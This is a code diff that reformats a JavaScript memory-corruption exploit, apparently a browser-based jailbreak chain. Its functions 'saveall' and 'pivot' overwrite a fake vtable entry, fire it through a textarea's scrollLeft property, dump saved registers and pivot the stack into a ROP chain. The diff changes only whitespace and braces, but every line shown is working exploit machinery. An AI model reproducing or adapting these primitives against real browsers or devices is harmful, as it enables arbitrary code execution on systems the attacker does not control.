@@ -40,19 +40,18 @@ function get_got_addr(idx) {
     return read_ptr_at(offset);
 }
 
-function saveall()
-{
+function saveall() {
     var ans = malloc(0x800);
-    var bak = read_ptr_at(fake_vtable+0x1d8);
-    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
+    var bak = read_ptr_at(fake_vtable + 0x1d8);
+    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
     tarea.scrollLeft = 0;
     write_mem(ans, read_mem(fake_vt_ptr, 0x400));
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-    bak = read_ptr_at(fake_vtable+0x1d8);
-    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
-    write_ptr_at(fake_vt_ptr+0x38, 0x1234);
+    bak = read_ptr_at(fake_vtable + 0x1d8);
+    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
+    write_ptr_at(fake_vt_ptr + 0x38, 0x1234);
     tarea.scrollLeft = 0;
-    write_mem(ans+0x400, read_mem(fake_vt_ptr, 0x400));
+    write_mem(ans + 0x400, read_mem(fake_vt_ptr, 0x400));
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
     return ans;
 }
@@ -64,18 +63,17 @@ This function is used to execute ROP chains. `buf` is an address of the start of
 * the actual ROP chain starts at `buf+8`
 * jump to `pivot_addr` to return
 */
-function pivot(buf)
-{
+function pivot(buf) {
     var ans = malloc(0x400);
-    var bak = read_ptr_at(fake_vtable+0x1d8);
-    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
+    var bak = read_ptr_at(fake_vtable + 0x1d8);
+    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
     tarea.scrollLeft = 0;
     write_mem(ans, read_mem(fake_vt_ptr, 0x400));
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-    bak = read_ptr_at(fake_vtable+0x1d8);
-    write_ptr_at(fake_vtable+0x1d8, pivot_addr);
-    write_ptr_at(fake_vt_ptr+0x38, buf);
-    write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
+    bak = read_ptr_at(fake_vtable + 0x1d8);
+    write_ptr_at(fake_vtable + 0x1d8, pivot_addr);
+    write_ptr_at(fake_vt_ptr + 0x38, buf);
+    write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);
     write_ptr_at(buf, ans);
     tarea.scrollLeft = 0;
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
